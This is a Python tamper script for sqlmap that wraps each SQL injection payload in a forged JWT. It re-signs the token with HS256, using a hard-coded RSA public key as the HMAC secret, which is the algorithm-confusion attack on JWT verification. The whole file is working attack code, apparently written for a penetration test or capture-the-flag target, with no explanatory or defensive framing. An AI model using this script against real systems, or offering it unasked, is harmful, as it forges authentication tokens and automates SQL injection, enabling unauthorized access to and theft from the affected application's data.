#!/usr/bin/env python3
 
import logging
import json
import hmac
from base64 import b64encode, b64decode
from lib.core.enums import PRIORITY
 
"""
Tamper script that encodes the sqlmap payload in the JWT payload
and re-signs the JWT with the public key.
"""
 
# Define which is the order of application of tamper scripts against the payload
__priority__ = PRIORITY.NORMAL
 
# output using the sqlmap internal logger
log2 = logging.getLogger("sqlmapLog")
 
# hard coded public key taken from the original JWT
public_key = "-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAzUnvbGidoxaoIlYQDtl8\n8BIK1YJRB4kghRPIIeKOCB0HaoVi55FfqVu+nQLPFh4jEKEF6Yh41tLZqb5QayjS\n9Hbx0RhZt3ZqQwI+BcF9ysnqRL0W1dzgneG2KKf7+QBZj58fjKJV2/iH/VsX1iei\ne176q2kVrSabv/5nQJcEnCELdYnuQa6BcuFPefr0rEeLDIfgB0zsHPJnNI1QY6TQ\nQDj++4nSW/wdyWSLwdUZCvdOD6pqTtzVTBON9RBEyL7BPjPZbyu9vHP9SqUBpSfI\nXG5RPm8HpZovmzwOW2K8Dk8amINrk+DXHNgV577ZGw2FyNiGo2bNKfhK9uVVslGQ\nEnn0ZgeYKHJcgAc5i6cnCoeHB4EDP2IyNMiIQXIVEDf+WM6+Op65Klhij2/wLRfw\nTo5srtGEBqaXjgROEhc2N6Ugs9AW9VXsWeSsa0bdIj7QDTwmYE8Y5wnuuORA4C9j\n6iESP77klFtPPRspeVeDZLhwn/6IviqdKfqhlnD97Fwpyz+c0MnOK2fQYS6FdmDK\nbw5smVFpj5QGMNbwm/O77A9gttUmdRaR/7BPxTr9elt4jd7z4pReE0NdjhDB6/Vc\nRw3gYa8l4ROsou6KFvIDXIQaLjpvGtq7Ze7rmNvNnkRkn67FJp43rbiWpMG8xfcE\n5bqmy7fNSiGkHy5uoVace9MCAwEAAQ==\n-----END PUBLIC KEY-----\n"
iat = 1603441231
 
 
def create_signed_token(key, data):
    """
    Creates a complete JWT token with 'data' as the JWT payload.
    Exclusively uses sha256 HMAC.
    """
    # create base64 header
    header = json.dumps({"typ":"JWT","alg":"HS256"}).encode()
    b64header = b64encode(header).rstrip(b'=')

    # create base64 payload 
    payload = json.dumps(data).encode()
    b64payload = b64encode(payload).rstrip(b'=')
 
    # put the header and payload together
    hdata = b64header + b'.' + b64payload
 
    # create the signature
    verifySig = hmac.new(key, msg=hdata, digestmod='sha256')
    verifySig = b64encode(verifySig.digest())
    verifySig = verifySig.replace(b'/', b'_').replace(b'+', b'-').strip(b'=')
 
    # put the header, payload and signature together
    token = hdata + b'.' + verifySig
    return token
 
 
def craftExploit(payload):
    pk = public_key.encode()
 
    # put the sqlmap payload in the data
    data = {"username": payload, "iat": iat}
    log2.info(json.dumps(data, separators=(',',':')))
 
    token = create_signed_token(pk, data)
    return token.decode('utf-8')
 
 
def tamper(payload, **kwargs):
    """
    This is the entry point for the script.  sqlmap calls tamper() for every payload.
    Encodes the sqlmap payload in the JWT payload
    and re-signs the JWT with the public key.
    """
    # create a new payload jwt token re-signed with HS256
    retVal = craftExploit(payload)
 
    #log2.info(json.dumps({"payload": payload}))
 
    # return the tampered payload
    return retVal